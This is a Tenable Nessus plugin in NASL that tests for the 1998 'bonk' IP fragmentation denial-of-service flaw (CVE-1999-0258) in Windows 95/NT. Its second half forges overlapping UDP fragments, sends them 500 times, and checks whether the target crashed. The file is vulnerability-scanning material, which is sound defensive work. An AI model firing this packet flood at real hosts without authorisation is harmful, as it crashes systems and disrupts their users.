#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10030);
 script_version("$Revision: 1.35 $");
 script_cvs_date("$Date: 2014/05/25 01:37:06 $");

 script_cve_id("CVE-1999-0258");
 script_osvdb_id(5730);

 script_name(english:"TCP/IP IP Fragmentation Remote DoS (bonk)");
 script_summary(english:"Crashes the remote host using the 'bonk' attack");

 script_set_attribute(attribute:"synopsis", value:
"The operating system on the remote host has a denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote server crash using the 'bonk'
attack. This is due to a design flaw in the remote operating system's
TCP/IP implementation.

An attacker may use this flaw to shut down this server, thus
preventing the network from working properly.");
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=88429524325956&w=2");
 script_set_attribute(attribute:"solution", value:"Contact the operating system vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");

 script_set_attribute(attribute:"vuln_publication_date", value:"1998/01/08");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/o:microsoft:windows_95");
 script_set_attribute(attribute:"cpe",value:"cpe:/o:microsoft:windows_nt");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_family(english:"Denial of Service");

 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");

 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if ( TARGET_IS_IPV6 ) exit(0);
if(islocalhost())exit(0);
start_denial();


PADDING = 0x1c;
FRG_CONST = 0x3;
sport = 123;
dport = 321;

addr = this_host();

ip = forge_ip_packet(ip_v  	: 4,
		     ip_hl 	: 5,
		     ip_len 	: 20 + 8 + PADDING,
		     ip_id 	: 0x455,
		     ip_p 	: IPPROTO_UDP,
		     ip_tos	: 0,
		     ip_ttl 	: 0x40,
		     ip_off 	: IP_MF,
		     ip_src	: addr);

udp1 = forge_udp_packet( ip 	: ip, uh_sport: sport, uh_dport: dport,
			 uh_ulen : 8 + PADDING, data:crap(PADDING));

ip = set_ip_elements(ip : ip, ip_off : FRG_CONST + 1, ip_len : 20 + FRG_CONST);

udp2 = forge_udp_packet(ip : ip,uh_sport : sport, uh_dport : dport,
			uh_ulen : 8 + PADDING, data:crap(PADDING));

send_packet(udp1, udp2, pcap_active:FALSE) x 500;
sleep(7);  # got false +ves at 5 seconds.
alive = end_denial();
if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(port:0, protocol:"udp");
                }
